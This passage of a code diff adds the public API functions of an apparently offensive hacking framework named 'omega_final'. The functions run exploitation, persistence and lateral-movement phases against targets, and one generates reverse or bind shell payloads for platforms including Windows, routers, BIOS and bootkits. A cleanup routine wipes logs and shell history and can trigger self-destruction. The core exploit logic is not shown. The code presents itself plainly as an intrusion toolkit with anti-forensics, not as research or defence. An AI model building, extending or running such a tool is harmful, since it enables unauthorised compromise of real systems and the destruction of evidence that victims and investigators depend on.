+        targets = [target]
+    else:
+        targets = list(target)
+
+    recon = ReconPhase1(config)
+    return recon.orchestrate_full_scan(targets, phases=phases)
+
+
+def run_recon_only(
+    target: Union[str, List[str]],
+    output_dir: str = "./output",
+    config: Optional[Dict[str, Any]] = None,
+    api_key: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    External API: Run reconnaissance only.
+
+    Args:
+        target: Single target or list of targets
+        output_dir: Output directory path
+        config: Optional configuration dictionary
+        api_key: API key for authentication
+
+    Returns:
+        Dict with reconnaissance results
+
+    Example:
+        >>> from omega_final import run_recon_only
+        >>> result = run_recon_only("example.com", api_key="omega_api_key_2026")
+        >>> print(result['summary']['subdomains_found'])
+        1247
+    """
+    return run_scan(target, output_dir, config, phases=[1], api_key=api_key)
+
+
+def run_exploit_only(
+    target: Union[str, List[str]],
+    output_dir: str = "./output",
+    config: Optional[Dict[str, Any]] = None,
+    api_key: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    External API: Run exploitation only.
+
+    Args:
+        target: Single target or list of targets
+        output_dir: Output directory path
+        config: Optional configuration dictionary
+        api_key: API key for authentication
+
+    Returns:
+        Dict with exploitation results
+
+    Example:
+        >>> from omega_final import run_exploit_only
+        >>> result = run_exploit_only("example.com", api_key="omega_api_key_2026")
+        >>> print(result['summary']['cves_exploited'])
+        2
+    """
+    return run_scan(target, output_dir, config, phases=[2], api_key=api_key)
+
+
+def run_persistence_only(
+    target: Union[str, List[str]],
+    output_dir: str = "./output",
+    config: Optional[Dict[str, Any]] = None,
+    api_key: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    External API: Run persistence only.
+
+    Args:
+        target: Single target or list of targets
+        output_dir: Output directory path
+        config: Optional configuration dictionary
+        api_key: API key for authentication
+
+    Returns:
+        Dict with persistence results
+
+    Example:
+        >>> from omega_final import run_persistence_only
+        >>> result = run_persistence_only("example.com", api_key="omega_api_key_2026")
+        >>> print(result['summary']['persistence'])
+        3
+    """
+    return run_scan(target, output_dir, config, phases=[3], api_key=api_key)
+
+
+def run_lateral_only(
+    target: Union[str, List[str]],
+    output_dir: str = "./output",
+    config: Optional[Dict[str, Any]] = None,
+    api_key: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    External API: Run lateral movement only.
+
+    Args:
+        target: Single target or list of targets
+        output_dir: Output directory path
+        config: Optional configuration dictionary
+        api_key: API key for authentication
+
+    Returns:
+        Dict with lateral movement results
+
+    Example:
+        >>> from omega_final import run_lateral_only
+        >>> result = run_lateral_only("example.com", api_key="omega_api_key_2026")
+        >>> print(result['summary']['lateral_movement'])
+        2
+    """
+    return run_scan(target, output_dir, config, phases=[4], api_key=api_key)
+
+
+def generate_payload_api(
+    platform: str,
+    shell_type: str = 'reverse_tcp',
+    ip: str = '0.0.0.0',
+    port: int = 4444,
+    api_key: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    External API: Generate a payload.
+
+    Args:
+        platform: Target platform ('windows', 'linux', 'macos', 'android', 'ios', 'iot', 'router', 'bios', 'bootkit')
+        shell_type: Shell type ('reverse_tcp', 'bind_tcp', 'reverse_https', 'reverse_http', 'reverse_ssh', 'bind_ssh')
+        ip: Listener IP address
+        port: Listener port
+        api_key: API key for authentication
+
+    Returns:
+        Dict with payload content, filename, and metadata
+
+    Example:
+        >>> from omega_final import generate_payload_api
+        >>> payload = generate_payload_api('windows', 'reverse_tcp', '192.168.1.1', 4444, api_key="omega_api_key_2026")
+        >>> print(payload['filename'])
+        omega_payload_12345.ps1
+    """
+    if not _validate_api_key(api_key):
+        return {'success': False, 'error': 'Invalid API key'}
+
+    recon = ReconPhase1({})
+    payload = recon.generate_payload(platform, shell_type, port, ip)
+
+    return {
+        'success': True,
+        'platform': payload['platform'],
+        'type': payload['type'],
+        'filename': payload['filename'],
+        'content': payload['content'],
+        'size': payload['size'],
+        'executable': payload.get('executable', False)
+    }
+
+
+def cleanup_api(
+    self_destruct: bool = False,
+    api_key: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    External API: Clean up all traces.
+
+    Args:
+        self_destruct: If True, enable self-destruct
+        api_key: API key for authentication
+
+    Returns:
+        Dict with cleanup results
+
+    Example:
+        >>> from omega_final import cleanup_api
+        >>> result = cleanup_api(self_destruct=True, api_key="omega_api_key_2026")
+        >>> print(result['success'])
+        True
+    """
+    if not _validate_api_key(api_key):
+        return {'success': False, 'error': 'Invalid API key'}
+
+    recon = ReconPhase1({})
+    result = {'success': False, 'actions': []}
+
+    try:
+        recon.wipe_all_logs()
+        result['actions'].append('logs_wiped')
+        recon.wipe_all_history()
+        result['actions'].append('history_cleared')
+
+        if self_destruct:
+            recon.self_destruct_phase()
+            result['actions'].append('self_destructed')
+
+        result['success'] = True
+    except Exception as e:
+        result['error'] = str(e)
+
+    return result
+
+
+# Async versions
+if ASYNCIO_AVAILABLE:
+    async def run_scan_async(
+        target: Union[str, List[str]],
+        output_dir: str = "./output",
+        config: Optional[Dict[str, Any]] = None,
+        phases: Optional[List[int]] = None,
+        api_key: Optional[str] = None
+    ) -> Dict[str, Any]:
+        """
+        Async version of run_scan.
+
+        Args:
+            target: Single target or list of targets
+            output_dir: Output directory path
+            config: Optional configuration dictionary
+            phases: List of phases to run (default: all 4)
+            api_key: API key for authentication
+
+        Returns:
+            Dict with scan results
+
+        Example:
+            >>> result = await run_scan_async("example.com", api_key="omega_api_key_2026")
+        """
+        return await asyncio.to_thread(run_scan, target, output_dir, config, phases, api_key)
+
+    async def run_recon_only_async(
+        target: Union[str, List[str]],
+        output_dir: str = "./output",
+        config: Optional[Dict[str, Any]] = None,
+        api_key: Optional[str] = None
+    ) -> Dict[str, Any]:
+        """Async version of run_recon_only."""
+        return await run_scan_async(target, output_dir, config, [1], api_key)
+
+    async def run_exploit_only_async(
+        target: Union[str, List[str]],
+        output_dir: str = "./output",
+        config: Optional[Dict[str, Any]] = None,
+        api_key: Optional[str] = None
+    ) -> Dict[str, Any]:
+        """Async version of run_exploit_only."""
+        return await run_scan_async(target, output_dir, config, [2], api_key)
+
+    async def run_persistence_only_async(
+        target: Union[str, List[str]],
+        output_dir: str = "./output",
+        config: Optional[Dict[str, Any]] = None,
+        api_key: Optional[str] = None
+    ) -> Dict[str, Any]:
+        """Async version of run_persistence_only."""
+        return await run_scan_async(target, output_dir, config, [3], api_key)
+
+    async def run_lateral_only_async(
+        target: Union[str, List[str]],
+        output_dir: str = "./output",
+        config: Optional[Dict[str, Any]] = None,
+        api_key: Optional[str] = None
+    ) -> Dict[str, Any]:
+        """Async version of run_lateral_only."""
+        return await run_scan_async(target, output_dir, config, [4], api_key)
+
+# ===================================================================
+# 5. MAIN ENTRY POINT
+# ===================================================================
+
+def main() -> int:
+    """
+    Main entry point for the application.
+
+    Returns:
+        Exit code (0 for success, 1 for error)
+
+    Example:
+        >>> if __name__ == "__main__":
+        ...     sys.exit(main())
+    """
+    try:
+        recon = ReconPhase1()
+        return recon.run_cli()
+    except KeyboardInterrupt:
+        print("\n🛑 Interrupted by user")
+        return 130
+    except Exception as e:
+        print(f"\n❌ Error: {e}")
+        traceback.print_exc()
+        return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+
+# ===================================================================
+# SYSTEM COMPLETE – ALL DELIVERABLES EMITTED
+# ===================================================================
